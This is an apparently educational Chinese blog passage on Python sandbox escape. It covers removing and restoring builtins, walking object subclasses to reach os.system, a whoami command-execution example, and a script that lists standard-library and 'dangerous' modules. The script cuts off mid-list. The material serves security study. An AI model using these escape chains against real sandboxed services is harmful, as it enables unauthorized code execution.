<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;getattr&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这时可以尝试重新导入<code>内建模块</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可用作首次导入</span></span><br></pre></td></tr></table></figure>
<p>但是Python2的<code>reload</code>也是内建模块，可以通过<code>del __builtins__.reload</code>删掉。</p>
<h2 id="builtins-builtin__与__builtins"><a class="markdownIt-Anchor" href="#builtins-builtin__与__builtins"></a> builtins、<strong>builtin__与__builtins</strong></h2>
<p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：<br>
首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。</p>
<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：<br>
2.x：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>3.x：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>但是，<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>这里稍微解释下 <code>x.__dict__</code> ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：</p>
<ol>
<li>内置的数据类型没有 <code>__dict__</code> 属性</li>
<li>每个类有自己的 <code>__dict__</code> 属性，就算存着继承关系，父类的 <code>__dict__</code> 并不会影响子类的 <code>__dict__</code></li>
<li>对象也有自己的 <code>__dict__</code> 属性，包含 <code>self.xxx</code> 这种实例属性</li>
</ol>
<p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br></pre></td></tr></table></figure>
<p>或者直接删了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明 <code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。</p>
<p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code></p>
<h2 id="构造逃逸链"><a class="markdownIt-Anchor" href="#构造逃逸链"></a> 构造逃逸链</h2>
<p>对于<code>a</code>模块嵌套导入的<code>b</code>模块中导入的<code>xxx</code>模块，可以通过<code>a.b.xxx</code>的方式来引用。如果标准库中嵌套导入了危险模块则会成为一个潜在风险，但是标准库也是需要先导入才能用的，如何才能打破僵局让潜在风险可被利用呢？</p>
<p>在Python3中所有的类都默认继承自<code>object</code>类、继承<code>object</code>的全部方法，在Python2中类默认为<code>classobj</code>，只有<code>['__doc__', '__module__']</code>两个方法，除非显式声明继承自<code>object</code>类。</p>
<p>思路一：如果<code>object</code>的某个派生类中存在危险方法，就可以直接拿来用</p>
<p>思路二：如果<code>object</code>的某个派生类导入了危险模块，就可以链式调用危险方法</p>
<p>思路三：如果<code>object</code>的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</p>
<p>思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</p>
<h3 id="获取object类"><a class="markdownIt-Anchor" href="#获取object类"></a> 获取object类</h3>
<p>Python建议类的protected类型、private类型及内部变量分别以<code>_xxx</code>、<code>__yyy</code>、<code>__zzz__</code>的形式命名，但这仅是一种代码风格规范，并未在语言层面作任何限制。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标可以用负数来倒数</span></span><br></pre></td></tr></table></figure>
<h3 id="遍历派生类"><a class="markdownIt-Anchor" href="#遍历派生类"></a> 遍历派生类</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/python/cpython/tree/2.7/Lib</span></span><br><span class="line"><span class="comment"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2标准库模块</span></span><br><span class="line">modules2 = [<span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;argparse.egg-info&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;config-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;lib-tk&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pdb.doc&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;wsgiref.egg-info&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3标准库模块</span></span><br><span class="line">modules3 = [<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;config-3.8-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;contextvars&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dataclasses&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;_py_abc&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;_sysconfigdata__x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tkinter&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险模块</span></span><br><span class="line">methods = [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span 